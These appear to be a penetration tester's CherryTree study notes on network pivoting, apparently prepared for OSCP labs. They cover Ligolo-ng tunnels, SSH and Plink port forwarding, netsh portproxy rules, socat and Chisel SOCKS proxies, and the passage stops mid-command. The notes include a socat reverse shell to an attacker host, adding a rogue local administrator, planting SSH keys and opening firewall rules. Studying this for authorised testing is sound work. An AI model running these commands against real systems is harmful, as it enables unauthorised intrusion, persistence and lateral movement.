<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Pivoting</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Pivoting</h1><br/><p><a name="Protocols & the OSI Model"></a><h1>Protocols &amp; the OSI Model</h1></p><p>Some methods of pivoting won&#39;t work for certain tasks, because they use different routing protocols or they operate at a different layer of the OSI Model.</p><p></p><p>For example, <span style="color:#ff0000;">Proxychains doesn&#39;t support UDP</span> traffic. NFS uses TCP &amp; UDP, so Proxychains is a less reliable method of interacting with a remote NFS Server. </p><p></p><p>Proxychains &amp; a Chisel server would work for the initial recon.</p><p></p><p><em>proxychains nmap -p111 --script=nfs-ls,nfs-statfs,nfs-showmount -v IP</em></p><p></p><p><h2>OSI Model</h2></p><p>The TCP/IP Model is more commonly used IRL, &amp; the OSI Model is more of a theoretical framework. I&#39;ll be using the OSI Model for these notes though.</p><p></p><p><h3>Layers</h3></p><p>Please Do Not Throw Salami Pizza Away</p><p><ol><li>Physical (Bits)</li><li>Data Link (Frames)</li><li>Network (Packets)</li><li>Transport (Segments)</li><li>Session (Data)</li><li>Presentation (Data)</li><li>Application (Data)</li></ol></p><p></p><p><h2>VPN</h2></p><p>VPNs are typically the best method for pivoting, since they operate at lower levels &amp; support both TCP &amp; UDP.</p><p></p><p><h3>Layers Used</h3></p><p>A VPN works primarily on Layer 3 (<strong>Network</strong>), but VPNs often encapsulate packets for secure transmission between devices using protocols like IPSec or OpenVPN, which operate at Layer 4 (Transport) depending on the VPN protocol used.</p><p></p><p>Put simply, it&#39;s possible for a VPN to operate at Layer 3, but in practice they <span style="color:#ff0000;">typically are using Layer 4</span>. This is still a low enough level to perform most basic actions (e.g. You still need local access to use things like ARP at Layer 2).</p><p></p><p><h3>Pivoting Tools</h3></p><p>These tools don&#39;t technically create a VPN connection, but in practice they are similar enough to fall into this category. These tools are often referred to as “VPN-like”.</p><p></p><p><span class="subheading">sshuttle</span>: Operates at Layer 3 (<strong>Network</strong>), supporting both TCP &amp; UDP. Behaves like a VPN, but with the simplicity of an SSH connection.</p><p></p><p><span class="subheading">Ligolo-ng</span>: Operates at Layer 4 (<strong>Transport</strong>), supporting both TCP &amp; UDP. </p><p></p><p><h2>SSH Port Forwarding</h2></p><p>[OSCP 232-233]</p><p></p><p>SSH Port Forwarding primarily operates at Layer 7 (<strong>Application</strong>) &amp; SSH is a TCP protocol so it <span style="color:#ff0000;">shouldn&#39;t work for UDP</span> unless you&#39;re using a special implementation (e.g. <strong>sshuttle</strong> or <strong>socat</strong>).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Why did it work for mounting this NFS volume if it doesn&#39;t support UDP? Proxychains failed here, so why is this SSH PF different?</p><p></p><p><em>ssh -L 2049:localhost:2049 bob@IP -i id_rsa -N -f</em></p><p></p><p><em>sudo mount -f nfs localhost: /tmp/mount</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you were using a different local port, you&#39;d need to specify it (e.g. <strong>-o port=1337</strong>)</p><p></p><p><h1>Ligolo-ng Tunnel</h1></p><p>[OSCP 167-170]</p><p>Target needs to have an interface that isn&#39;t currently reachable via Attacker&#39;s Routing Table. If this isn&#39;t the case, need to setup <a href="Pivoting_22.html#PF">PF</a> (or maybe some manual routing shenanigans?)</p><p></p><p>It&#39;s ok if target only has 1 interface (excl loopback), as long as it&#39;s in an internal network that Attacker can&#39;t directly route to. (e.g used<a href="Recon_+_Services--Mail_Services--SMTP_26.html#Malicious Email"> Malicious Email</a> to get shell on internal machine which used an external SMTP server as its proxy).</p><p></p><p>May need to <a href="Exploit_Research--Compiling_Code_32.html#go static">statically compile</a> if target doesn&#39;t have the neccessary dependencies.</p><p></p><p><h2>Initial Setup</h2></p><p><strong>{Atker}</strong> <em>sudo ip tuntap add user asura mode tun ligolo &amp;&amp; sudo ip link set ligolo up</em><em></em></p><p><em></em><em></em></p><p><em></em><strong>{Atker} </strong><em>./proxy -selfcert</em><em></em></p><p><em></em><em></em></p><p><em></em><strong>{Target}</strong><em> .\agent.exe -connect ATKER:11601 -ignore-cert</em><em></em></p><p><em></em><em></em></p><p><em></em><strong>{Atker&#39;s Proxy} </strong><em>session	</em>[Select <strong>1</strong>]</p><p><em></em></p><p><em></em><strong>{Atker&#39;s Proxy}</strong><em> ifconfig</em><em></em></p><p><em></em><em></em></p><p><em></em><em><strong>{Atker}</strong></em><em> sudo ip route add 172.16.212.0/24 dev ligolo &amp;&amp; ip -c r</em><em></em></p><p><em></em><em></em></p><p><em></em><em><strong>{Atker&#39;s Proxy} </strong></em><em>start</em><em></em></p><p><em></em><em></em></p><p><em></em><em><strong>{Atker}</strong></em><em> ping 172.16.212.254</em>			 (Test, assuming that target responds to ICMP)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: You don&#39;t need to create FW rule to allow incoming connections from Internal IP, do you? I think it&#39;s routed through agent&#39;s external IP, but seemed to help 1 time?</p><p></p><p><a name="scan tunneling"></a><h2>Port Scans</h2><h2></h2></p><p><h2></h2>Certain limitations when scanning through tunnel. Use <span style="color:#ff0000;">--unprivileged</span> &amp; <span style="color:#ff0000;">-Pn</span> (Although ping should work. &amp; seems to, nmap wants -Pn). (Allegedly -PE could work instead of --unprivileged)</p><p></p><p>Start w/o -p arg (doing only common ports), since full scan can be very slow. Later to full scan ↓ &amp; then UDP scan (UDP should also work through Tunnel, unless --unprivileged causes issues?)</p><p></p><p>Offsec Mentor <span style="color:#ff0000;">reccomended using -sT</span> for connect scan- “It&#39;s slower, especially in tunnel, but more accurate.&quot; </p><p></p><p><em>sudo nmap -sV -sT -v -iL ~/Documents/medtech/internal_targets.txt -p- --unprivileged -Pn -oN ~/Documents/medtech/nmap_internal.txt</em><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><span style="color:#060f94;text-decoration:underline;">Tip</span>: May want <span style="color:#ff0000;">-T4</span><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><h3>UDP Scans</h3></p><p>UDP should theoretically work. UDP Scans require root privs, which conflicts with --unprivileged. Can try w/o it, but may give false postivies or cause issues by omitting that arg.<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><a name="listener"></a>Creating Listener</p><p>[OSCP 168-169]</p><p>Depending on their routing config (view Routing Table with <em>Get-NetRoute</em>), target&#39;s on the internal network may not know how to connect back to the Attacker (unless they can route to the internet, or to a host that knows how to reach you).</p><p></p><p>This means you may have to <span style="color:#ff0000;">create a Ligolo listener for </span>things like<span style="color:#ff0000;"> Reverse Shells &amp; File Transfers.</span> </p><p></p><p>★ Target may need to <span style="color:#ff0000;">point to Pivot&#39;s Internal IP</span> address!</p><p></p><p><h3>File Transfer Tips</h3></p><p>You may be able to get around this by using something like<strong> evil-winrm</strong> for file transfers, since traffic will be naturally routed through your WinRM connection over HTTP. Could also use <strong>impacket-psexec</strong></p><p></p><p>May also be able to get around this by using an SMB Share on the “pivot” machine. Internal machine just uploads/downloads to &amp; from that share.</p><p></p><p><h3>Create TCP Listener</h3></p><p>May need to use common ports to bypass Target Net&#39;s FW</p><p></p><p>Using the Attacker&#39;s Proxy window, &amp; inside the desired session run the following-</p><p></p><p><em>listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp</em></p><p><em>listener_list</em></p><p></p><p><h3>Use Listener</h3></p><p><strong>{Atker} </strong><em>python3 -m http.server 4321</em><em></em></p><p><em></em><em><strong>{Pivot} </strong></em><em> iwr -uri http://10.10.111.142:1234/SharpHound.ps1 -outfile .\SharpHound.ps1</em>			(Assuming the Ligolo agent is running on host 10.10.111.142)</p><p></p><p><h2>Tunnels^2</h2></p><p>&quot;I heard you liked tunnels, so we got a tunnel for your tunnel!&quot;</p><p></p><p>Ligolo-ng can be used with <a href="https://systemweakness.com/double-pivoting-for-newbies-with-ligolo-ng-4177b3f1f27b">multiple tunnels</a> to <span style="color:#ff0000;">pivot between multiple networks</span>! For ex, External → DMZ → Internal. </p><p></p><p><span style="color:#060f94;text-decoration:underline;">Important</span>: There were diff cmds/methods used in 2 guides &amp; on the official Github page. The args used weren&#39;t supported in my ver of Ligolo, maybe they&#39;d work in a later update? What worked for me was the aforementioned link that used only 1 Ligolo interface.</p><p></p><p>This <a href="https://medium.com/@issam.qsous/mastering-multi-pivot-strategies-unleashing-ligolo-ngs-power-double-triple-and-even-quadruple-dca6b24c404c">guide</a> used a new interface for each tunnel, which you specified in the Proxy like-		<em> start --tun ligolo2</em></p><p></p><p>The <a href="https://github.com/nicocha30/ligolo-ng?tab=readme-ov-file#using-ligolo-ng">Github</a> page had you specify a custom interface like-			<em>start_tunnel --tun ligolo2</em></p><p>A <a href="https://github.com/nicocha30/ligolo-ng/issues/60">random comment</a> used diff syntax, which may&#39;ve just been a typo?		<em>tunnel_start --tun  ligolo2</em></p><p></p><p><h3>Background</h3></p><p>Setup the 1st tunnel (we&#39;ll call this machine<strong> agent_1</strong>)</p><p></p><p>Create a listener on agent_1 to recv the connection from <strong>agent_2</strong> &amp; specify port 11601 (def port for Ligolo-ng&#39;s Proxy)</p><p></p><p>Setup the tunnel similarly as before, but specifying the new listener, (etc)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Depending on routing configuration of <strong>agent_2</strong>, may need to use a Listener to transfer the agent.exe file to it.</p><p></p><p>If <strong>agent_2</strong> can route to Attacker&#39;s machine, may not need to create a listener on<strong> agent_1</strong> for tunnel, &amp; can instead connect directly to Attacker like normal</p><p></p><p><h3>Commands</h3></p><p><strong>{Proxy: Session 1}</strong> <em>listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp</em></p><p></p><p><strong>{agent_2}</strong> <em>.\agent -connect 192.168.248.220:11601 -ignore-cert</em>				(<span style="color:#ff0000;">Specifying </span><strong><span style="color:#ff0000;">agent_1</span></strong><span style="color:#ff0000;">&#39;s IP</span>, instead of the Attacker&#39;s)</p><p></p><p><strong>{Atker&#39;s Proxy} </strong><em>session</em>			[Select <strong>2</strong> <span style="color:#ff0000;">using arrow keys</span> to scroll down]</p><p></p><p><strong>{Proxy: Session 2} </strong><em>ifconfig</em></p><p></p><p><strong>{Atker}</strong><em> sudo ip r add 10.20.138.0/24 dev ligolo &amp;&amp; ip -c r</em>		(Specifying the 2nd network you&#39;re pivoting to)</p><p></p><p><strong>{Proxy: Session 2}</strong> <em>start</em></p><p></p><p><span class="subheading">Result</span>: <strong>? Tunnel already running, switch from USER@agent_1 to USER@agent_2?</strong></p><p></p><p><strong>{Proxy: Session 2}</strong><em> y</em> 			(Specify yes to the above prompt)</p><p></p><p><span class="subheading">Result</span>: Output saying it&#39;s <strong>Closing tunnel</strong> then that it&#39;s <strong>Starting tunnel</strong></p><p></p><p><strong>{Atker}</strong><em> </em>ping 10.20.138.13 (Test to confirm that you can reach both networks)</p><p></p><p><h2>Local Port Forwarding</h2></p><p><span style="color:#060f94;text-decoration:underline;">Disclaimer</span>: I&#39;m using an older version of Ligolo &amp; haven&#39;t tried this yet.</p><p></p><p>Newer versions of Ligolo-ng support <a href="https://medium.com/@Thigh_GoD/ligolo-ng-finally-adds-local-port-forwarding-5bf9b19609f9">Local Port Forwarding</a>. Ligolo l uses a unique IP <strong>240.0.0.1</strong> in an unused subnet to redirects traffic to the target IP, which forwards <strong>any</strong> port.</p><p></p><p>Instead of using the target&#39;s IP/CIDR, you create a route to this Ligolo IP address &amp; use it for command that you want to port forward. For example, to PF 9090:</p><p></p><p><strong>{Atker}</strong><em> sudo ip route add 240.0.0.1/32 dev ligolo</em></p><p></p><p><em>curl http://240.0.0.1:9090/</em></p><p></p><p><h1>SSH Tunnel/PF</h1></p><p>[OSCP 170-176]</p><p></p><p><h2>Forward Connection (Local)</h2></p><p>[CTF B 7 &amp; OSCP 171-172]</p><p>For ex, to connect Attackers port 9999 to target&#39;s port 8000-</p><p></p><p><em>ssh -L 9999:localhost:8000 user@target -N -f -i id_rsa</em></p><p></p><p><h3>Creating Keys for Target</h3></p><p>If SSH is enabled on the host, but target doesn&#39;t have keys, you can give them some.</p><p></p><p><span class="subheading">Create Keys</span>: <strong>ssh-keygen</strong>		then 		<strong>cat id_rsa.pub &gt; authorized_keys</strong></p><p></p><p><span class="subheading">Transfer Keys</span>: Transfer public key to Target &amp; then <strong>mkdir ~/.ssh</strong> <strong>&amp;&amp;</strong> <strong>cat ~/.ssh/id_rsa.pub &gt; ~/.ssh/authorized_keys</strong></p><p></p><p><h2>Remote PF</h2></p><p>[OSCP 174-176 &amp; Wreath 62-64]</p><p>The Attacker will run the SSH Server &amp; the Target will act as the Client who connects to it. This is more likely to bypass a FW, since outbound traffic is less strictly regulated.</p><p></p><p>Another advantage is that you won&#39;t need to compromise a target&#39;s creds. You&#39;ll often be able to set up an SSH Remote PF using any low priv user (e.g <strong>www-data</strong>).</p><p></p><p><a name="ssh setup"></a><h3>Setup SSH Server</h3></p><p><span class="subheading">Authentication</span>: Can sign into Attacker&#39;s machine using Creds (Unsafe!) or with a <span style="color:#ff0000;">Key</span></p><p><ol><li>Create key with <em>ssh-keygen</em>  (May need to set passwd. For ex, sec_passwd)</li></ol></p><p><ol><li>Add the contents of pub key to authorized_keys (<span style="color:#ff0000;">incl all the fancy Sec measures</span> [OSCP 175]- command=&quot;echo &#39;This account can only be used for port forwarding&#39;&quot;,no-agent-forwarding,no-x11-forwarding,no-pty)</li></ol></p><p><ol><li><em>chmod 600 ~/.ssh/authorized_keys</em> (if needed? Also seen chmod 644?)</li></ol></p><p><ol><li>Transfer the priv key to target</li></ol></p><p><ol><li>If sshd is already running on Attacker&#39;s machine, you may need to restart it</li></ol></p><p><ol><li> <strong> {Client}</strong> <em>chmod 600 /tmp/priv_key</em></li></ol></p><p></p><p><span class="subheading">Daemon</span>:  Check status &amp; if it&#39;s stopped, run the following.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Is this supposed the be <strong>sshd</strong> not <strong>ssh</strong>? Seemed to work, alias?</p><p></p><p><em>systemctl status ssh</em> </p><p></p><p><em>sudo systemctl start ssh</em></p><p></p><p></p><p><h3>Stabilize Shell</h3><h3></h3></p><p><h3></h3>You need to have TTY functionality on Client machine to setup the SSH Connection. For ex,</p><p></p><p><em>python3 -c “import pty;pty.spawn(&#39;/bin/bash&#39;);”</em></p><p><h3></h3></p><p><h3>Connect </h3><strong><h3> </h3></strong><strong></strong></p><p><strong></strong>Depends on the type of PF you want to setup (i.e  forward a port listening on localhost, forward traffic to another machine, or setup a Dynamic PF)<strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong><span class="subheading">Localhost PF</span>: To create a PF between the client&#39;s port 631 &amp; the Attacker&#39;s port 9999 run the following.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: See Troubleshooting section. May need to add an arg like <strong>-o StrictHostKeychecking=no</strong></p><p></p><p><strong>{Client}</strong>  <em>ssh -fN -R 631:9999 asura@ATKER -i /tmp/priv_key</em></p><p></p><p>OR</p><p></p><p><strong>{Client}</strong>  <em>ssh -fN -R 631:ATKER:9999 asura@ATKER -i /tmp/priv_key</em></p><p></p><p><h3>Clean Up</h3></p><p><span class="subheading">Locate Process</span>: Find the PID, which should be the 1st number. </p><p></p><p><strong>{Client}</strong> <em>ps aux</em> <em>| grep ssh</em><span class="subheading"></span></p><p><span class="subheading"></span><span class="subheading"></span></p><p><span class="subheading">Close Connection</span>: <strong>{Client}</strong> <em>kill PID</em><span class="subheading"></span></p><p><span class="subheading"></span><span class="subheading"></span></p><p><span class="subheading">Destroy Key</span>: shred vs rm [OSCP 176]. rm is insufficient. For some overkill-</p><p></p><p> <strong>{Client}</strong> <em>shred -vzu -n5 /tmp/priv_key</em>			(Confirm with <em>ls -la /tmp</em>)<span class="subheading"></span></p><p><span class="subheading"></span><span class="subheading"></span></p><p><span class="subheading">Reset Attacker</span><ol><li>Remove key from <strong>~/.ssh/authorized_keys</strong></li></ol></p><p><ol><li><em>sudo systemctl stop ssh</em></li></ol></p><p><ol><li><em>ss -tulpn</em>   (Sanity check)</li></ol></p><p></p><p><h2>Troubleshooting</h2></p><p><h3>Permission Denied</h3></p><p>May get this error message, as if the creds weren&#39;t valid, but PF may still have worked. Verify with <strong>ss -tulpn</strong> or <strong>ps aux | less</strong></p><p></p><p><h3>PF Stopped Working</h3></p><p>If PF randomly stopped working, try killing the process &amp; restarting the PF. If it keeps failing, may need to revert machine or look for issues elsewhere.</p><p></p><p><strong>ps aux | grep -i “ssh”</strong><strong></strong></p><p><strong>kill</strong> PID</p><p></p><p><h3>Failed to add the host to the list of known hosts (/PATH/.ssh/known_hosts)</h3></p><p>Try running with the following option</p><p></p><p><em>-o StrictHostKeychecking=no</em></p><p></p><p><a name="PF"></a><h1>Port Forwarding</h1></p><p>If that target has ports listening locally, you&#39;ll need to setup PF to access them from an external host (i.e your attacking machine).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: More PF techniques listed in other sections of this Node.</p><p></p><p><h2>Windows</h2></p><p>[OSCP 178-182]</p><p></p><p><h3>OpenSSH (ssh.exe)</h3></p><p>See <a href="Recon_+_Services--SSH_23.html#openssh">SSH</a></p><p></p><p><a name="plink"></a><h3>Plink</h3></p><p>See plink.exe in <a href="file:///usr/share/windows-resources/binaries">/usr/share/windows-resources/binaries</a></p><p></p><p><span class="subheading">★Establish GUI Session★</span>: Plink is hard to manage over a R shell (&amp; may prevent you from using SSH Keys, neccesitating you enter your passwd on target; bad OPSEC!).</p><p>If you don&#39;t already have GUI access to target, but have high privs you can <span style="color:#ff0000;">create a new local admin &amp; use that account for RDP</span> (e.g you&#39;re SYSTEM but wan&#39;t to setup PF for pivoting).</p><p>Local Admins have various RCE (incl RDP) by def. Can also add a compromised account into the administrators group (may be more stealthy).</p><p></p><p><em>net user dave2 password123! /add</em><em></em></p><p><em></em><em></em></p><p><em>net localgroup administrators dave2 /add</em></p><p></p><p><strong>{Atker}</strong> <em>xfreerdp /v:TARGET /u:dave2 /p:&#39;password123!&#39; /dynamic-resolution</em></p><p></p><p><span class="subheading">Create Key Pair</span>: First setup SSH Server [OSCP 175-176] &amp; then generate/convert SSH keys for Plink [OSCP 179]</p><p><ol><li>Create key with <em>ssh-keygen</em>  (May need to set passwd. For ex, sec_passwd)</li></ol></p><p><ol><li>Convert to proper format like <em>puttygen priv_key -o outputkey.ppk</em></li></ol></p><p><ol><li>Add the contents of pub_key to authorized_keys (<span style="color:#ff0000;">incl all the fancy Sec measures</span> [OSCP 175]- command=&quot;echo &#39;This account can only be used for port forwarding&#39;&quot;,no-agent-forwarding,no-x11-forwarding,no-pty)</li></ol></p><p><ol><li>chmod 600 ~/.ssh/authorized_keys (if needed?)</li></ol></p><p><ol><li>Transfer the PPK &amp; plink.exe to target</li></ol></p><p></p><p><span class="subheading">Connecting via GUI</span>: Using GUI connection is preferrable. If attempting over CLi, you won&#39;t see any error msgs &amp; will need to adapt the cmd slightly. (I used admin PS prompt, likely not neccesary).</p><p></p><p><em>.\plink.exe -R 8000:127.0.0.1:51556 asura@ATKER -i .\plink.ppk -N</em> 	(After entering passphrase for key, you&#39;ll be prompted to hit “Return to begin session.” <span style="color:#ff0000;">Press Enter</span>)</p><p>{Atker}<em> ss -tulpn</em>		(Verify that PF is setup)</p><p></p><p>This example connects Attackers port 8000 to target&#39;s port 51556. May need to use a diff port for Attacker?</p><p></p><p><span class="subheading">Connecting via CLi</span>: If using CLi, may/may not be able to use SSH Key that doesn&#39;t have a passwd &amp; piping in <em>echo y </em>to select “yes&quot; like-</p><p></p><p><em>cmd /c echo y | .\plink.exe -R 8000:127.0.0.1:51556 192.168.45.217 -i .\plink.ppk -N</em></p><p></p><p>Otherwise, may/may not be able to specify passwd for key by storing it in a file  &amp; passing it to the above cmd like-</p><p></p><p><em>Write-Output “sec_passwd” &gt; ./passwd.txt</em></p><p><em>cmd /c echo y | .\plink.exe -R 8000:127.0.0.1:51556 192.168.45.217 -i .\plink.ppk -pwfile .\passwd.txt -N</em></p><p></p><p></p><p><h2>Firewall Rules (netsh)</h2></p><p>The benefit is that no additional SW is needed (LotL). The downside is that you need to have RCE as a high priv account to make FW rules.</p><p></p><p>For example, instruct <strong>netsh interface</strong> to <strong>add</strong> a <strong>portproxy</strong> rule from an IPv4 listenerthat is forwarded to an IPv4 port (<strong>v4tov4</strong>). This will listen onport 2222 on the external-facing interface (<strong>listenport=2222 listenaddress=192.168.50.64</strong>) and forward packets to port 22 on PGDATABASE01 (<strong>connectport=22 connectaddress=10.4.50.215</strong>).</p><p></p><p><span class="subheading">Create Port Forward</span></p><p><em>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215</em></p><p></p><p><span class="subheading">Verify</span>: Won&#39;t receive any output, but can confirm it worked by running one of the following commands (look for this specific port&#39;s network activity or list FW rules in general).</p><p></p><p><em>netstat -anp TCP | find &quot;2222&quot;</em><em></em></p><p><em></em><em></em></p><p><em>netsh interface portproxy show all</em></p><p></p><p><span class="subheading">Allow Connection through FW</span>: Config target&#39;s FW to allow incoming connections on this new port.</p><p></p><p><em>netsh advfirewall firewall add rule name=&quot;port_forward_ssh_2222&quot; protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow</em></p><p></p><p><span class="subheading">Verify</span>: Should now be able to scan this port with Nmap, &amp; the output will look something like- <strong>2222/tcp open  EtherNetIP-1</strong></p><p></p><p><em>sudo nmap -sS 192.168.50.64 -Pn -n -p2222</em></p><p></p><p><span class="subheading">Use</span>: Should now be able to connect to whatever service you&#39;re pivoting to by targetting the IP used to create this PF.</p><p></p><p><em>ssh database_admin@192.168.50.64 -p2222</em></p><p></p><p><span class="subheading">Clean Up</span>: Delete the PF &amp; the FW rule that allowed you to connect to this new port. Won&#39;t get any output for the second command!</p><p></p><p><em>netsh advfirewall firewall delete rule name=&quot;port_forward_ssh_2222&quot;</em></p><p></p><p><em>netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64</em></p><p></p><p><h2>{Linux} FW &amp; iptables</h2></p><p>See <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#FW">SysAdmin</a>.</p><p></p><p><h1>ProxyChains</h1></p><p>[OSCP 173-174]</p><p></p><p><h2>Authentication</h2></p><p>If proxy requires Auth to use, can append creds to that entries line, seperating user &amp; passwd with a space.</p><p></p><p><h2>Speed</h2></p><p>Decreasing the TCP timeout times can dramatially increase speed (likely at the cost of accuracy).</p><p></p><p><h1>socat</h1></p><p>[OSCP 165-166 &amp; Wreath 66-77]</p><p>Takes <span style="color:#ff0000;">up to 2 addresses</span> as arguments, or an address and another cmd like <strong>exec:</strong>. May be possible to use &gt;2 addresses by using pipes &amp; other ghetto methods.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: socat uses <strong>-</strong> as an alias for <strong>STDIO</strong> (stdin &amp; stdout), &amp; can be used in lieu of a 2nd address. It&#39;s used redirect STDIO to the specified address.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: You can upload a static binary of socat to target machine. Exists for Linux &amp; Windows (see ~/static_binaries)</p><p></p><p><h2>Port Forward</h2></p><p><h3>Local</h3></p><p>Access a port listening on localhost:8081 via the external IP:2345 with the following.</p><p></p><p><em>./socat tcp-l:2345,fork tcp:localhost:8081 &amp;</em></p><p></p><p><h2>Unix Sockets</h2></p><p>A <span style="color:#ff0000;">Unix domain socket</span> aka <span style="color:#ff0000;">UDS</span> or <span style="color:#ff0000;">IPC</span> socket (inter-process communication socket) is a data communications endpoint for exchanging data between processes executing on the same host operating system. It is also referred to by its address family <span style="color:#ff0000;">AF_UNIX</span>. See <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">Background info</a>, <a href="https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets">UNIX Socket vs TCP/IP Socket</a>, &amp; <a href="https://unix.stackexchange.com/questions/26715/how-can-i-communicate-with-a-unix-domain-socket-via-the-shell-on-debian-squeeze">using with socat</a>. Sockets <span style="color:#ff0000;">often are referred to as a file</span> &amp; may show up as a diff color via ls (e.g purple)!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: If you&#39;ve <strong>netcat-openbsd</strong> (as opposed to <strong>netcat-traditional</strong>), you can also interact with UNIX Sockets via <em>-U</em>. For ex, <em>nc -U /var/run/socket</em></p><p></p><p><h3>Create</h3></p><p><em>socat - UNIX-LISTEN:/tmp/s</em></p><p><span class="subheading"></span></p><p><span class="subheading"></span><h3>Use</h3></p><p><em>socat - UNIX-CONNECT:/tmp/s</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you <span style="color:#ff0000;">see a proc connecting to a socket</span> that you can create / hijack, that proc may try to authenticate upon connection. This means that <span style="color:#ff0000;">creds may be passed into your listener</span>!</p><p></p><p><h2>Reverse Shell</h2></p><p></p><p><strong>{Target}</strong> <em>socat TCP:ATKER:9999 exec:/bin/sh,pty,stderr,setsid,sigint,sane</em></p><p><strong>{Atker}</strong> <em>socat - tcp-l:9999</em></p><p></p><p><a name="Chisel"></a><h1>Chisel</h1></p><p>[Wreath 78-82 &amp; OSCP 184-185]</p><p></p><p>The Server will run on port 1080 by default.</p><p></p><p>There are several advantages to using <a href="https://github.com/jpillora/chisel/">Chisel</a>:</p><p><ol><li><strong>Different OS</strong>: There are compilation instructions for different OS&#39;s like Linux &amp; Windows.</li></ol></p><p><ol><li><strong>Static Compilation</strong>: Can be <a href="file:///home/asura/git/chisel/build/v1.10.0/59e5362e6bd6c0ea3e02f99209a1359416a952aa/bin/">statically compiled</a> for the target&#39;s OS, so it can be used on almost any target.</li></ol></p><p><ol><li><strong>HTTP Tunnel</strong>: Appears like HTTP traffic increasing the likelihood that it bypasses network defenses</li></ol></p><p><ol><li><strong>SSH Encryption</strong>: Even if you don&#39;t have SSH access to the target, Chisel will encrypt the traffic with SSH for increased security &amp; obfuscation.</li></ol></p><p><ol><li><strong>Flexibility</strong>: Can create a Proxy or a Port Forward, depending on the arguments used.</li></ol></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Backgrounding Process</span>: Many examples append <strong>&amp;</strong> to the command, so you don&#39;t lose your current shell. I have had mixed results with this, sometimes the tunnel seems to stop working when it&#39;s in the background.</p><p></p><p><h2>Proxy</h2></p><p>Typically used in conjunction with tools like <strong>proxychains</strong> or <strong>FoxyProxy</strong>, but some tools like <strong>curl</strong> also have a built-in proxy argument that can be used instead.</p><p></p><p><h3>Reverse SOCKS Proxy</h3></p><p>[Wreath 78-81]</p><p>Connects back from the Target to the Attacker&#39;s listener. Reverse Proxies are typically more stealthy &amp; less likely to be stopped by a Firewall in the Target Network.</p><p></p><p><strong>{Attacker} </strong><em>./chisel server -p 8888 --reverse -v</em></p><p></p><p><strong>{Attacker} </strong><em>sudo tcpdump -nvvvXi tun0 tcp port 8888</em>				(Optional step to isolate &amp; watch Chisel&#39;s traffic. May help with troubleshooting)</p><p></p><p><strong>{Target}</strong><em> ./chisel_static client ATTACKER:8888 R:socks</em>			(Optionally append <strong>&gt; /dev/null 2&gt;&amp;1 &amp;</strong>)</p><p></p><p><span class="subheading">ProxyChains Config</span>: In Kali, the master config file is <a href="file:///etc/proxychains4.conf">/etc/proxychains4.conf</a>. Ensure you&#39;re editing the correct config file (e.g. The master config file will be superceded by a copy of the config file placed in the PWD)</p><p></p><p><strong>[ProxyList]</strong></p><p>...</p><p><strong>socks5 127.0.0.1 1080</strong></p><p></p><p><span class="subheading">Accessing Target&#39;s Loopback Address</span>: If you wanted to access target&#39;s 127.0.0.1:3000 using <strong>proxychains</strong>, you can run the following command. Proxychains won&#39;t use the attackers localhost.</p><p></p><p><em>proxychains curl http://127.0.0.1:3000</em></p><p></p><p><h3>Forward SOCKS Proxy</h3></p><p>They&#39;re not as useful as a Reverse Proxy, since these are more likely to be blocked by the target&#39;s Network &amp; are less stealthy (think of it like Bind Shell vs Reverse Shell).</p><p></p><p>The end of the Attacker&#39;s command (<strong>1337:socks</strong>) is specifying a Proxy Port, which will cause a SOCKS Proxy to be opened on that port on the Attacker&#39;s machine.</p><p></p><p><strong>{Target}</strong><em> ./chisel_static</em> <em>server -p 8888 --socks5</em><em></em></p><p><em></em></p><p><strong>{Attacker} </strong><em>./chisel client TARGET:8888 1337:socks</em></p><p></p><p><h3>Run SSH through SOCKS Proxy</h3></p><p></p><p><span class="subheading">Using ProxyCommand Arg</span>: The command we construct tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The <strong>%h</strong> and <strong>%p </strong>tokens represent the SSH command host and port values, which SSH will fill in before running the command.</p><p></p><p><em>ssh -o ProxyCommand=&#39;ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p&#39; database_admin@10.4.50.215</em></p><p></p><p><span class="subheading">Using ProxyChains</span>: I think you should be able to connect through Proxychains as well.</p><p></p><p><em>proxychains ssh user@ssh_server</em></p><p></p><p><h2>Port Forward</h2></p><p>Allows you to access the target destination by sending traffic to designated port on localhost, thereby <span style="color:#ff0000;">removing the need for other tools</span> like <strong>proxychains</strong> or <strong>FoxyProxy</strong>.</p><p></p><p><h3>Remote Port Forward</h3></p><p>Specify the target destination after the attacker&#39;s port in <strong>R:</strong>. For example, to forward traffic sent to localhost:1337 to port 8080 on 172.18.0.1, run the following.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you want to forward traffic to a low port on the server, the chisel server must be run with sudo!</p><p></p><p><strong>{Attacker} </strong><em>./chisel</em> <em>server -p 8888 --reverse</em></p><p></p><p><strong>{Target}</strong><em> ./chisel_static client ATTACKER:8888 